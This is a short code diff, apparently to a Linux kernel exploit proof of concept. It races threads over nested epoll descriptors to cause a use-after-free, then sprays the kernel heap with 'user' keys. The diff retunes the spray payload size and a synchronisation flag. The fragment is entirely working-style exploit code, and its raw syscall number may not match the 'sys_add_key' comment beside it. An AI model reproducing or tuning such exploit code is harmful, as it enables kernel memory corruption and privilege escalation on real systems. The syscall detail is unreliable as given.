@@ -12,7 +12,7 @@
 
 int outer_epoll;
 int inner_epoll;
-volatile int sync_flag = 1;
+volatile int sync_flag = 0;
 volatile int loop_iteration = 0;
 
 void *thread_a(void *arg) {
@@ -41,12 +41,12 @@ void *thread_b(void *arg) {
     close(inner_epoll);
     
     // Perform heap spray immediately after free
-    char payload[168];
+    char payload[128];
     memset(payload, 'A', sizeof(payload));
     for (int i = 0; i < 256; i++) {
         char desc[32];
         sprintf(desc, "uaf_test_%d_%d", loop_iteration, i);
-        long ret = syscall(217, "user", desc, payload, 168, -2); // sys_add_key, KEY_SPEC_PROCESS_KEYRING
+        long ret = syscall(217, "user", desc, payload, 128, -2); // sys_add_key, KEY_SPEC_PROCESS_KEYRING
         if (ret < 0) {
             printf("[*] sys_add_key failed: ret=%ld, errno=%d\n", ret, errno);
         } else {
